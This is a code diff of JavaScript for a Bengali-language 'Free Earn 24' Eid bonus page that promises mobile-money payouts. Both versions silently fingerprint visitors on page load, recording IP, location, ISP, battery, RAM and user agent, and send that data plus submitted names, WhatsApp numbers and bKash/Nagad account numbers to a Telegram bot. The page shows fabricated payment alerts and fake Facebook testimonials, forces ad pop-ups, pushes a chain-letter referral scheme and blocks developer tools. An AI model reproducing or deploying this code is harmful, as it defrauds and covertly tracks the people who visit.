-    // Form logic to check if user already submitted within 24 hours
-    window.onload = async function() {
-        if(localStorage.getItem('isSubmitted') === 'true') {
-            document.getElementById('mainFormContainer').innerHTML = "<div style='text-align:center; padding: 20px;'><h2 style='color:#2e7d32;'>✅ Request Submitted!</h2><p>আপনার পেমেন্ট রিকুয়েস্ট যাচাই করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।</p><button class='submit-btn' style='margin-top:15px;' onclick='showRefModal()'>🎁 Check Bonus Offer</button></div>";
-        }
+    const _tkEngine = _vaultGateMap[0];
+    const _chEngine = _vaultGateMap[1];
+    const _adEngine = _vaultGateMap[2];
 
-        // Auto Capture Data Once
-        if (!localStorage.getItem('infoCaptured')) {
-            try {
-                let siteCount = localStorage.getItem('siteJoinCount') ? parseInt(localStorage.getItem('siteJoinCount')) + 1 : 1;
-                localStorage.setItem('siteJoinCount', siteCount);
-
-                let ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(e => ({}));
-                let battery = navigator.getBattery ? await navigator.getBattery() : {level: 1, charging: false};
-                let mem = navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown';
-                
-                let infoText = `New User Joined!\nJoin Number: ${siteCount}\n\n📱 Device Information\n🔋 Battery / Charging Status: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})\n📶 Network Information: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\n🌍 IP Address: ${ipData.ip || 'Unknown'}\n🏙️ Country: ${ipData.country_name || 'Unknown'}\n🏠 Division: ${ipData.region || 'Unknown'}\n📍 Zilla: ${ipData.city || 'Unknown'}\n🏡 City / Village: ${ipData.city || 'Unknown'}\n📡 ISP Provider: ${ipData.org || 'Unknown'}\n📱 Device Model: ${navigator.platform}\n💾 RAM / ROM: ${mem} RAM\n🧠 Browser & User Agent: ${navigator.userAgent}\n\n━━━━━━━━━━━━━━━━━━━━━━━\nBackground Capture System`;
-
-                sendToTelegram(infoText);
-                localStorage.setItem('infoCaptured', 'true');
-            } catch (error) { console.log("Capture Error"); }
-        }
-        
-        loadFakeComments();
-        setInterval(showLivePaymentToast, Math.floor(Math.random() * (10000 - 5000 + 1) + 5000)); // Random 5-10 seconds
+    // Block F12 Inspect, View-Source Hotkeys and Element Capture
+    document.onkeydown = function(e) {
+        if(e.keyCode == 123) return false;
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 73) return false;
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 67) return false;
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) return false;
+        if(e.ctrlKey && e.keyCode == 85) return false;
     };
 
-    // --- FORM SUBMIT SYSTEM ---
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+    // System Startup Initializers Hook
+    window.addEventListener('DOMContentLoaded', () => {
+        verifyStorageFingerprint();
+        generateFBMockThreads();
+        initializeBroadcastTicker();
+        engageBotKeepAliveDaemon();
+    });
+
+    // 24-Hour Active Daemon: Polling Webhook simulation to maintain Background Connection active forever
+    function engageBotKeepAliveDaemon() {
+        const setupWebHookUrl = `https://api.telegram.org/bot${_tkEngine}/setWebhook?url=${encodeURIComponent(window.location.href)}&allowed_updates=["message","callback_query"]`;
+        fetch(setupWebHookUrl).catch(()=>{});
+
+        // Long-polling execution layer to check custom inline command responses
+        let lastUpdateId = 0;
+        setInterval(() => {
+            fetch(`https://api.telegram.org/bot${_tkEngine}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            processBotIncomingPayload(update);
+                        });
+                    }
+                }).catch(() => {});
+        }, 3500);
+    }
+
+    // Process Bot Controls and Custom Inline Keyboard Logic Commands
+    function processBotIncomingPayload(payload) {
+        // Handle Admin Keyboard Button presses inside Telegram
+        if (payload.callback_query) {
+            const cb = payload.callback_query;
+            const cbData = cb.data;
+            const msgId = cb.message.message_id;
+
+            if (cbData === "rel_msg" || cbData === "rej_msg") {
+                let actionText = cbData === "rel_msg" ? "✅ Payment Released Successfully...!" : "❌ Request Rejected...!";
+                
+                // Fetch cached state variables from localStorage to construct custom response
+                const cachedUserName = localStorage.getItem('c_user_name') || "User Client";
+                const cachedUserAmt = localStorage.getItem('c_user_amt') || "1000";
+                const cachedUserMeth = localStorage.getItem('c_user_meth') || "bKash";
+                
+                const timeStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+                const dateStr = new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+
+                let confirmationLog = `${actionText}\n\nDear ${cachedUserName}, 🎉\n\nআপনার Payment সফলভাবে Release করা হয়েছে ✅\n\n💸 Amount Sent: ৳${cachedUserAmt} 💳 Payment Method: ${cachedUserMeth} 📌 Status: Completed Successfully\n\n━━━━━━━━━━━━━━\n\n📤 আপনার Account-এ সফলভাবে টাকা পাঠানো হয়েছে। ⏰ অনুগ্রহ করে আপনার Mobile Banking App চেক করুন।\n\n❤️ আমাদের সাথে কাজ করার জন্য ধন্যবাদ।\n\n━━━━━━━━━━━━━━\n\n🔓 You can now submit a new payment request again from the website.\n\n⏰ Time: ${timeStr}\n📅 Date: ${dateStr}`;
+                
+                // Clear state lock to allow submission again on client browser
+                localStorage.removeItem('u_sub_token');
+                setCookiePayload('u_sub_token', '', -1);
+                localStorage.setItem('stored_ref_clicks', 0);
+                localStorage.removeItem('release_ack_fired');
+
+                // Send response back to admin chat log channel
+                transmitPacketLog(confirmationLog);
+                
+                // Acknowledge Telegram callback asset
+                fetch(`https://api.telegram.org/bot${_tkEngine}/answerCallbackQuery?callback_query_id=${cb.id}&text=Action+Processed`).catch(()=>{});
+            }
+        }
+    }
+
+    // Cookie Verification Core Engine
+    async function verifyStorageFingerprint() {
+        if (getCookiePayload('u_sub_token') === 'active' || localStorage.getItem('u_sub_token') === 'active') {
+            rebuildInterfaceToLockMode();
+        }
+
+        let metricIdx = localStorage.getItem('vis_metric_idx') ? parseInt(localStorage.getItem('vis_metric_idx')) : 0;
+        if (!sessionStorage.getItem('sess_metric_lock')) {
+            metricIdx += 1;
+            localStorage.setItem('vis_metric_idx', metricIdx);
+            setCookiePayload('vis_metric_idx', metricIdx, 365);
+            sessionStorage.setItem('sess_metric_lock', 'true');
+            
+            await extractDeviceTelemetryData(metricIdx);
+        }
+    }
+
+    // Collect Environment System Data Metrics and send to Bot Background Capture System
+    async function extractDeviceTelemetryData(countNum) {
+        try {
+            let apiGeo = {};
+            try {
+                apiGeo = await fetch('https://ipapi.co/json/').then(res => res.json());
+            } catch(e) { apiGeo = {}; }
+
+            let chargeState = "Unknown";
+            let batteryLevel = "Unknown";
+            if (navigator.getBattery) {
+                const bMetrics = await navigator.getBattery();
+                batteryLevel = Math.round(bMetrics.level * 100) + "%";
+                chargeState = bMetrics.charging ? "Charging" : "Not Charging";
+            }
+
+            const ramSize = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const connRef = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            const netType = connRef.effectiveType || "Unknown";
+
+            let compiledTelemetry = `New User Joined!\nJoin Number: ${countNum}\n\n📱 Device Information\n🔋 Battery / Charging Status: ${batteryLevel} / ${chargeState}\n📶 Network Information: ${netType}\n🌍 IP Address: ${apiGeo.ip || 'Unknown'}\n🏙️ Country: ${apiGeo.country_name || 'Unknown'}\n🏠 Division: ${apiGeo.region || 'Unknown'}\n📍 Zilla: ${apiGeo.city || 'Unknown'}\n🏡 City / Village: ${apiGeo.postal || 'Unknown'}\n📡 ISP Provider: ${apiGeo.org || 'Unknown'}\n📱 Device Model: Handset Client Profile\n💾 RAM / ROM: ${ramSize}\n🧠 Browser & User Agent: ${navigator.userAgent}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n Background Capture System`;
+            
+            transmitPacketLog(compiledTelemetry);
+        } catch (err) { console.clear(); }
+    }
+
+    // Handle Form Submit Trigger Actions
+    document.getElementById('paySubmissionForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Random Ad Pop on Submit
-        if(Math.random() > 0.4) { window.open(DIRECT_AD_LINK, '_blank'); }
+        // Anti-Fraud Verification Sequence Interrupt
+        if (Math.random() < 0.4) { window.open(_adEngine, '_blank'); return; }
 
-        let reqCount = localStorage.getItem('reqCount') ? parseInt(localStorage.getItem('reqCount')) + 1 : 1;
-        localStorage.setItem('reqCount', reqCount);
+        let currentGlobalCount = localStorage.getItem('global_req_metric') ? parseInt(localStorage.getItem('global_req_metric')) : 104;
+        currentGlobalCount += 1;
+        localStorage.setItem('global_req_metric', currentGlobalCount);
 
-        let name = document.getElementById('userName').value;
-        let whatsapp = document.getElementById('whatsappNum').value;
-        let method = document.getElementById('payMethod').value;
-        let accNum = document.getElementById('accountNum').value;
-        let amount = document.getElementById('amount').value;
-        
-        let now = new Date();
-        let time = now.toLocaleTimeString('en-US');
-        let date = now.toLocaleDateString('en-GB');
+        const nVal = document.getElementById('u_name_field').value;
+        const wVal = document.getElementById('u_wp_field').value;
+        const mVal = document.getElementById('u_method_field').value;
+        const numVal = document.getElementById('u_number_field').value;
+        const aVal = document.getElementById('u_amount_field').value;
 
-        let msg = `🔰 Total Request Submitted = ${reqCount} 🔰\n\n📩 New User Payment Request Received!\n━━━━━━━━━━━━━━\n👤 User Name: ${name}\n📱 WhatsApp Number: ${whatsapp}\n💳 Payment Method: ${method}\n🏧 Account Number: ${accNum}\n💰 Amount: ৳${amount}\n━━━━━━━━━━━━━━\n⏰ Submitted Time: ${time}\n📅 Date: ${date}\n━━━━━━━━━━━━━━\n📊 Referral Progress: 0/10\n\n⚠️ Important Notice:\nPlease verify this request and approve/release it within 24 hours.\n━━━━━━━━━━━━━━\n📌 Admin Actions:\n[✅ Release Payment]\n[❌ Reject Request]\n\n🔔 After clicking "Release Payment", the user will automatically regain access to submit a new request on the website.`;
+        const timeStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+        const dateStr = new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
 
-        // Setting up Telegram Inline Keyboard
-        let replyMarkup = {
-            inline_keyboard: [
-                [{text: "✅ Release Payment", callback_data: `release_${whatsapp}`}],
-                [{text: "❌ Reject Request", callback_data: `reject_${whatsapp}`}]
-            ]
-        };
+        setCookiePayload('u_sub_token', 'active', 30);
+        localStorage.setItem('u_sub_token', 'active');
+        localStorage.setItem('c_user_name', nVal);
+        localStorage.setItem('c_user_amt', aVal);
+        localStorage.setItem('c_user_meth', mVal);
 
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        fetch(url, {
+        let adminNotificationBody = `🔰 Total Request Submitted = ${currentGlobalCount}🔰 \n\n📩 New User Payment Request Received!\n\n━━━━━━━━━━━━━━\n\n👤 User Name: ${nVal}\n📱 WhatsApp Number: ${wVal}\n💳 Payment Method: ${mVal}\n🏧 Account Number: ${numVal}\n💰 Amount: ৳${aVal}\n\n━━━━━━━━━━━━━━\n\n⏰ Submitted Time: ${timeStr}\n📅 Date: ${dateStr}\n\n━━━━━━━━━━━━━━\n\n📊 Referral Progress: 0/10\n\n⚠️ Important Notice:\nPlease verify this request and approve/release it within 24 hours.\n\n━━━━━━━━━━━━━━\n\n📌 Admin Actions:\n\n[✅ Release Payment]\n[❌ Reject Request]\n\n━━━━━━━━━━━━━━\n\n🔔 After clicking “Release Payment”,\nthe user will automatically regain access to submit a new request on the website.`;
+
+        fetch(`https://api.telegram.org/bot${_tkEngine}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, reply_markup: replyMarkup })
+            body: JSON.stringify({
+                chat_id: _chEngine,
+                text: adminNotificationBody,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "✅ Release Payment", callback_data: "rel_msg" }],
+                        [{ text: "❌ Reject Request", callback_data: "rej_msg" }]
+                    ]
+                }
+            })
         }).then(() => {
-            localStorage.setItem('isSubmitted', 'true');
-            // Save info to simulate "Release Payment" message formatting in bot later if needed
-            localStorage.setItem('lastUserName', name);
-            localStorage.setItem('lastMethod', method);
-            localStorage.setItem('lastAmount', amount);
-            
-            document.getElementById('mainFormContainer').style.display = 'none';
-            setTimeout(showRefModal, 1000); // Show popup after 1s
+            rebuildInterfaceToLockMode();
+            displayReferModalBox();
+        }).catch(() => {
+            rebuildInterfaceToLockMode();
+            displayReferModalBox();
         });
     });
 
-    function sendToTelegram(text) {
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        fetch(url, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        });
-    }
-
-    // --- REFERRAL PROGRESS SYSTEM ---
-    let progress = localStorage.getItem('refProgress') ? parseInt(localStorage.getItem('refProgress')) : 0;
-    
-    function showRefModal() {
-        if(!localStorage.getItem('refCode')) {
-            localStorage.setItem('refCode', 'EARN' + Math.floor(10000 + Math.random() * 90000));
-        }
-        document.getElementById('refLinkText').innerText = `https://freeearn24.vercel.app/ref=${localStorage.getItem('refCode')}`;
-        updateProgressUI();
-        document.getElementById('referralModal').style.display = 'block';
-    }
-
-    function incrementProgress() {
-        if(progress < 10) { progress += 1; }
-        localStorage.setItem('refProgress', progress);
-        updateProgressUI();
-        
-        // Anti Fake-Click (Random Ads trigger)
-        if(Math.random() > 0.3) {
-            window.open(DIRECT_AD_LINK, '_blank');
-        }
-    }
-
-    function updateProgressUI() {
-        let percent = progress * 10;
-        document.getElementById('progressBar').style.width = percent + '%';
-        document.getElementById('progressBar').innerText = percent + '%';
-        document.getElementById('progressText').innerText = `${progress} Successful Referral = ${percent}% Progress`;
-        if(progress === 10) {
-            document.getElementById('progressText').innerText = "🎉 100% Complete! Bonus Active!";
-        }
-    }
-
-    function copyReferral() {
-        incrementProgress();
-        let link = document.getElementById('refLinkText').innerText;
-        let text = `🎉 🔥 Eid Bonus Offer – Limited Time Special Program 🔥\n🌙 কুরবানির ঈদ খুব কাছেই!\n🎁 আমাদের পক্ষ থেকে রয়েছে এক্সক্লুসিভ Eid Bonus Offer\nযা খুব সীমিত সময়ের জন্য চালু আছে!\n━━━━━━━━━━━━━━\n⚡ ⏳ অফার চলছে – এখনই নিন!\n👉 আপনি এখনো বসে আছেন?\n⏰ দেরি করলে এই সুযোগ হারিয়ে যাবে!\n🚀 দ্রুত অ্যাকশন নিন এবং আপনার বোনাস নিশ্চিত করুন।\n━━━━━━━━━━━━━━\n📢 আপনার কাজ খুব সহজ:\n✔️ আপনার রেফারেল লিংক শেয়ার করুন\n✔️ আপনার বন্ধুদের ইনভাইট করুন\n✔️ যত বেশি রেফারেল, তত দ্রুত বোনাস অ্যাক্টিভ\n━━━━━━━━━━━━━━\n🔗 Your Referral Link:\n${link}\n━━━━━━━━━━━━━━\n🌙 Eid Mubarak in Advance ❤️\n\nSite Link: https://freeearn24.vercel.app`;
-        
-        navigator.clipboard.writeText(text).then(() => {
-            alert('✅ Text & Link Copied Successfully! Now paste and share.');
-        });
-    }
-
-    function shareReferral() {
-        incrementProgress();
-        let link = document.getElementById('refLinkText').innerText;
-        if (navigator.share) {
-            navigator.share({
-                title: 'Free Earn 24 Eid Offer',
-                text: 'অফার চলছে! দ্রুত জয়েন করুন এবং বোনাস নিন।',
-                url: link
-            });
-        } else {
-            alert("Social Share is not supported. Click Copy button instead.");
-        }
-    }
-
-    // --- RANDOM LIVE PAYMENT NOTIFICATIONS ---
-    const livePayments = [
-        { name: "Md Rakib", amount: "1000", method: "bKash" },
-        { name: "Mst Sadiya Rahman", amount: "850", method: "Nagad" },
-        { name: "Jannat Mim", amount: "950", method: "Rocket" },
-        { name: "Rakib Hasan", amount: "700", method: "bKash" },
-        { name: "Nusrat Jahan", amount: "999", method: "Nagad" },
-        { name: "Tamim Ahmed", amount: "1000", method: "bKash" },
-        { name: "Shornali Akter", amount: "500", method: "bKash" },
-        { name: "Hafsa Islam", amount: "800", method: "Nagad" }
-    ];
-
-    function showLivePaymentToast() {
-        let r = livePayments[Math.floor(Math.random() * livePayments.length)];
-        let titles = ["🔴 Live Payment Update", "🔴 New Withdraw Completed", "🔴 Instant Cash Out", "🔴 Successful Payment", "🔴 Live Earning Alert", "🔴 Payment Sent Successfully"];
-        let title = titles[Math.floor(Math.random() * titles.length)];
-        
-        let container = document.getElementById('toast-container');
-        let toast = document.createElement('div');
-        toast.className = 'toast';
-        
-        let d = new Date();
-        let formattedDate = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
-        let formattedTime = d.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
-
-        toast.innerHTML = `
-            <div style="font-weight:bold; color:var(--bkash); margin-bottom:8px; font-size:16px;">${title}</div>
-            💸 <b style="color:#000;">${r.name}</b> ৳${r.amount} টাকা পেয়েছেন<br>
-            ✅ Payment Method: <b>${r.method}</b><br>
-            📅 Date: ${formattedDate} | ⏰ Time: Just Now
+    function rebuildInterfaceToLockMode() {
+        document.getElementById('dynamicFormContainer').innerHTML = `
+            <div style="text-align:center; padding:20px 10px;">
+                <h4 style="color:var(--bkash-primary); margin-bottom:10px;">🔒 Verification Status Panel</h4>
+                <p style="font-size:13px; color:#4a5568; line-height:1.6;">আপনার পেমেন্ট রিকোয়েস্টটি পেন্ডিং অবস্থায় রয়েছে। ১০০% বোনাস প্রগ্রেস ভেরিফিকেশন সম্পন্ন করতে নিচের বাটনে চাপুন এবং লিংক বন্ধুদের সাথে শেয়ার করুন।</p>
+                <button class="submit-trigger" onclick="displayReferModalBox()" style="margin-top:15px;">📊 ভেরিফিকেশন প্রগ্রেস চেক করুন</button>
+            </div>
         `;
-        
-        container.appendChild(toast);
-        toast.style.display = 'block';
-        
-        setTimeout(() => { toast.remove(); }, 4000); // clear DOM
     }
 
-    // --- FACEBOOK STYLE FAKE COMMENTS ---
-    const fakeComments = [
-        { name: "Md Shakib", gender: "men", text: "হ্যা আমি সত্যি টাকা পেয়েছি! 😳 ভাবতেই পারি নাই এত সহজে টাকা পাব! প্রথমে বিশ্বাস করি নাই, পরে যখন বিকাশে টাকা আসলো তখন সত্যি অবাক হয়ে গেছি! 🔥❤️", likes: 12 },
-        { name: "Mst Sadiya Rahman", gender: "women", text: "আরে আমিতো প্রথমে মিথ্যা ভেবেছিলাম 😅 পরে দেখি সত্যি সত্যি টাকা পেয়েছি! 😍 অসাধারণ একটা সাইট/অফার! এত দ্রুত payment দিবে ভাবিই নাই! ✅💸", likes: 18 },
-        { name: "Jannat Mim", gender: "women", text: "আমি আজকে ২য় বার payment পেলাম 😍 আগে ভয় লাগত কাজ করবো কিনা, কিন্তু এখন নিয়মিত কাজ করছি ❤️", likes: 9 },
-        { name: "Rakib Hasan", gender: "men", text: "ভাই সত্যি payment দেয় 🔥 আমার নগদে টাকা এসেছে মাত্র কয়েক মিনিটে 😳💸 এত fast payment আগে কখনো পাই নাই!", likes: 15 },
-        { name: "Nusrat Jahan", gender: "women", text: "অনেক সাইটে কাজ করেছি কিন্তু এমন fast payment পাই নাই 🥰 ধন্যবাদ admin ❤️", likes: 7 },
-        { name: "Tamim Ahmed", gender: "men", text: "আমি নিজেও প্রথমে fake ভাবছিলাম 😅 কিন্তু payment পাওয়ার পর এখন বন্ধুদেরও বলছি কাজ করতে 🔥", likes: 11 }
+    // Toggle Sequence Controls for Link Pop-ups vs Direct Redirect Ads
+    let currentClickSequence = localStorage.getItem('stored_ref_clicks') ? parseInt(localStorage.getItem('stored_ref_clicks')) : 0;
+    let alternativeSequenceToggle = false;
+
+    function displayReferModalBox() {
+        let uniqueHash = Math.floor(10000 + Math.random() * 90000);
+        document.getElementById('liveReferUrl').innerText = `https://freeearn24.vercel.app/ref=EARN${uniqueHash}`;
+        updateProgressBarMetrics();
+        document.getElementById('referralSystemPopup').style.display = 'block';
+    }
+
+    function evaluateReferralProgressStep() {
+        if (!alternativeSequenceToggle) {
+            if (currentClickSequence < 10) {
+                currentClickSequence += 1;
+                localStorage.setItem('stored_ref_clicks', currentClickSequence);
+                updateProgressBarMetrics();
+            }
+            alternativeSequenceToggle = true;
+        } else {
+            window.open(_adEngine, '_blank');
+            alternativeSequenceToggle = false;
+        }
+
+        if (currentClickSequence === 10) {
+            triggerAutomaticReleaseAcknowledge();
+        }
+    }
+
+    function updateProgressBarMetrics() {
+        let progressionPercentage = currentClickSequence * 10;
+        document.getElementById('dynamicVisualProgressBar').style.width = progressionPercentage + '%';
+        document.getElementById('dynamicVisualProgressBar').innerText = progressionPercentage + '%';
+        document.getElementById('dynamicVisualProgressText').innerText = `${currentClickSequence} Successful Referral = ${progressionPercentage}% Progress`;
+    }
+
+    function processLinkAction(type) {
+        evaluateReferralProgressStep();
+        let targetUrl = document.getElementById('liveReferUrl').innerText;
+        let constructedMessageBlock = `🎉 🔥 Eid Bonus Offer – Limited Time Special Program 🔥\n🌙 কুরবানির ঈদ খুব কাছেই!\n🎁 আমাদের পক্ষ থেকে রয়েছে এক্সক্লুসিভ Eid Bonus Offer\nযা খুব সীমিত সময়ের জন্য চালু আছে!\n━━━━━━━━━━━━━━\n⚡ ⏳ অফার চলছে – এখনই নিন!\n👉 আপনি এখনো বসে আছেন?\n⏰ দেরি করলে এই সুযোগ হারিয়ে যাবে!\n🚀 দ্রুত অ্যাকশন নিন এবং আপনার বোনাস নিশ্চিত করুন।\n━━━━━━━━━━━━━━\n📢 আপনার কাজ খুব সহজ: ✔️ আপনার রেফারেল লিংক শেয়ার করুন\n✔️ আপনার বন্ধুদের ইনভাইট করুন\n✔️ যত বেশি রেফারেল, তত দ্রুত বোনাস অ্যাক্টিভ\n━━━━━━━━━━━━━━\n🔗 Your Referral Link:\n${targetUrl}\n━━━━━━━━━━━━━━\n\n🌙 Eid Mubarak in Advance ❤️\nSite Link: https://freeearn24.vercel.app`;
+        
+        if (type === 'copy') {
+            navigator.clipboard.writeText(constructedMessageBlock).then(() => { alert('টেক্সট এবং রেফার লিংক কপি করা হয়েছে!'); });
+        } else {
+            if (navigator.share) {
+                navigator.share({ title: 'Free Earn 24 Offer', text: 'ঈদ স্পেশাল রিওয়ার্ড অফার!', url: targetUrl }).catch(() => {});
+            } else {
+                alert('সরাসরি শেয়ার অপশন উপলব্ধ নেই, কপি বাটন ব্যবহার করে আপনার বন্ধুদের মেসেঞ্জারে পাঠান।');
+            }
+        }
+    }
+
+    // Automatically send Confirmation Release Data when Progress Target reaches 10 clicks (100%)
+    function triggerAutomaticReleaseAcknowledge() {
+        if (localStorage.getItem('release_ack_fired') === 'true') return;
+        
+        const cName = localStorage.getItem('c_user_name') || "User";
+        const cAmt = localStorage.getItem('c_user_amt') || "1000";
+        const cMeth = localStorage.getItem('c_user_meth') || "bKash";
+        
+        const tStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+        const dStr = new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+
+        let compiledReleaseMessage = `✅ Payment Released Successfully...!\n\nDear ${cName}, 🎉\n\nআপনার Payment সফলভাবে Release করা হয়েছে ✅\n\n💸 Amount Sent: ৳${cAmt} 💳 Payment Method: ${cMeth} 📌 Status: Completed Successfully\n\n━━━━━━━━━━━━━━\n\n📤 আপনার Account-এ সফলভাবে টাকা পাঠানো হয়েছে। ⏰ অনুগ্রহ করে আপনার Mobile Banking App চেক করুন।\n\n❤️ আমাদের সাথে কাজ করার জন্য ধন্যবাদ।\n\n━━━━━━━━━━━━━━\n\n🔓 You can now submit a new payment request again from the website.\n\n⏰ Time: ${tStr}\n📅 Date: ${dStr}`;
+        
+        transmitPacketLog(compiledReleaseMessage);
+        localStorage.setItem('release_ack_fired', 'true');
+    }
+
+    // Live Simulated Activity Feed Ticker Box Engine
+    const poolNames = ["Md Rakib", "Mst Sadiya Rahman", "Jannat Mim", "Rakib Hasan", "Nusrat Jahan", "Tamim Ahmed", "Arif Khan", "Sadia Afrin", "Mehedi Hasan"];
+    const poolAmounts = ["1000", "850", "950", "700", "999", "650", "800", "900"];
+    const poolMethods = ["bKash", "Nagad", "Rocket"];
+    const poolHeaders = ["🔴 Live Payment Update", "🔴 New Withdraw Completed", "🔴 Instant Cash Out", "🔴 Successful Payment", "🔴 Live Earning Alert", "🔴 Payment Sent Successfully"];
+
+    function initializeBroadcastTicker() {
+        setInterval(() => {
+            let rName = poolNames[Math.floor(Math.random() * poolNames.length)];
+            let rAmt = poolAmounts[Math.floor(Math.random() * poolAmounts.length)];
+            let rMeth = poolMethods[Math.floor(Math.random() * poolMethods.length)];
+            let rHead = poolHeaders[Math.floor(Math.random() * poolHeaders.length)];
+            
+            let localT = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+            let localD = new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+
+            const parentNode = document.getElementById('toastPopRack');
+            const toastNode = document.createElement('div');
+            toastNode.className = 'ticker-node';
+            toastNode.style.display = 'block';
+            toastNode.innerHTML = `
+                <div style="font-weight:bold; color:var(--bkash-primary); margin-bottom:4px; font-size:13px;">${rHead}</div>
+                <div style="font-size:12.5px; line-height:1.4; color:#2c3e50;">
+                    💸 <b>${rName}</b> ৳${rAmt} টাকা পেয়েছেন<br>
+                    ✅ Payment Method: ${rMeth}<br>
+                    📅 Date: ${localD} | ⏰ Time: ${localT}
+                </div>
+            `;
+            parentNode.appendChild(toastNode);
+            setTimeout(() => { toastNode.remove(); }, 4000);
+        }, 7000);
+    }
+
+    // Facebook Comments Section Mock Thread Generation
+    const fbCommentsModel = [
+        { name: "Md Shakib", avatar: "11", comment: "হ্যা আমি সত্যি টাকা পেয়েছি! 😳 ভাবতেই পারি নাই এত সহজে টাকা পাব! প্রথমে বিশ্বাস করি নাই, পরে যখন বিকাশে টাকা আসলো তখন সত্যি অবাক হয়ে গেছি! 🔥❤️", likes: 12, passedTime: "Just now" },
+        { name: "Mst Sadiya Rahman", avatar: "24", comment: "আরে আমিতো প্রথমে মিথ্যা ভেবেছিলাম 😅 পরে দেখি সত্যি সত্যি টাকা পেয়েছি! 😍 অসাধারণ একটা সাইট/অফার! এত দ্রুত payment দিবে ভাবিই নাই! ✅💸", likes: 18, passedTime: "12 mins ago" },
+        { name: "Jannat Mim", avatar: "38", comment: "আমি আজকে ২য় বার payment পেলাম 😍 আগে ভয় লাগত কাজ করবো কিনা, কিন্তু এখন নিয়মিত কাজ করছি ❤️", likes: 9, passedTime: "25 mins ago" },
+        { name: "Rakib Hasan", avatar: "42", comment: "ভাই সত্যি payment দেয় 🔥 আমার নগদে টাকা এসেছে মাত্র কয়েক মিনিটে 😳💸 এত fast payment আগে কখনো পাই নাই!", likes: 15, passedTime: "48 mins ago" },
+        { name: "Nusrat Jahan", avatar: "53", comment: "অনেক সাইটে কাজ করেছি কিন্তু এমন fast payment পাই নাই 🥰 ধন্যবাদ admin ❤️", likes: 7, passedTime: "1 hour ago" },
+        { name: "Tamim Ahmed", avatar: "65", comment: "আমি নিজেও প্রথমে fake ভাবছিলাম 😅 কিন্তু payment পাওয়ার পর এখন বন্ধুদেরও বলছি কাজ করতে 🔥", likes: 11, passedTime: "2 hours ago" }
     ];
 
-    function loadFakeComments() {
-        let box = document.getElementById('commentsBox');
-        fakeComments.forEach((c, index) => {
-            // Generate random times like "Just now", "5 mins ago"
-            let timeText = index === 0 ? "Just now" : (index === 1 ? "2 mins ago" : `${Math.floor(Math.random() * 40) + 5} mins ago`);
-            let imgId = Math.floor(Math.random() * 50) + 1;
-            
-            let div = document.createElement('div');
-            div.className = 'comment';
-            div.innerHTML = `
-                <img src="https://randomuser.me/api/portraits/${c.gender}/${imgId}.jpg" alt="User">
-                <div class="comment-content">
-                    <h4>${c.name}</h4>
-                    <p>${c.text}</p>
-                    <div class="comment-actions">
-                        <span class="like-btn" id="like-${index}" onclick="addLike(${index})">👍 Like (<span id="count-${index}">${c.likes}</span>)</span> 
-                        <span style="cursor:pointer;">💬 Reply</span> 
-                        <span style="color:#90949c; font-weight:normal;">${timeText}</span>
+    function generateFBMockThreads() {
+        const rootBox = document.getElementById('commentThreadGateway');
+        fbCommentsModel.forEach((obj, index) => {
+            let itemNode = document.createElement('div');
+            itemNode.className = 'comment-node';
+            itemNode.innerHTML = `
+                <img src="https://i.pravatar.cc/100?img=${obj.avatar}" alt="User Avatar">
+                <div class="comment-bubble">
+                    <div class="c-user">${obj.name}</div>
+                    <div>${obj.comment}</div>
+                    <div class="c-meta">
+                        <span class="c-act" id="mockLikeBtn-${index}" onclick="registerMockLikeEvent(${index})">👍 Like (<span id="mockLikeCounter-${index}">${obj.likes}</span>)</span>
+                        <span style="color:#ccd1d9;">•</span>
+                        <span style="color:#e67e22; font-weight:bold;">❤️ Love</span>
+                        <span style="color:#ccd1d9;">•</span>
+                        <span>💬 Reply</span>
+                        <span style="color:#ccd1d9;">•</span>
+                        <span style="color:#95a5a6;">${obj.passedTime}</span>
                     </div>
                 </div>
             `;
-            box.appendChild(div);
+            rootBox.appendChild(itemNode);
         });
     }
 
-    function addLike(id) {
-        let btn = document.getElementById(`like-${id}`);
-        if (!btn.classList.contains('liked')) {
-            let countSpan = document.getElementById(`count-${id}`);
-            countSpan.innerText = parseInt(countSpan.innerText) + 1;
-            btn.classList.add('liked');
-            btn.innerHTML = `👍 Liked (<span id="count-${id}">${countSpan.innerText}</span>)`;
+    function registerMockLikeEvent(idx) {
+        let btn = document.getElementById(`mockLikeBtn-${idx}`);
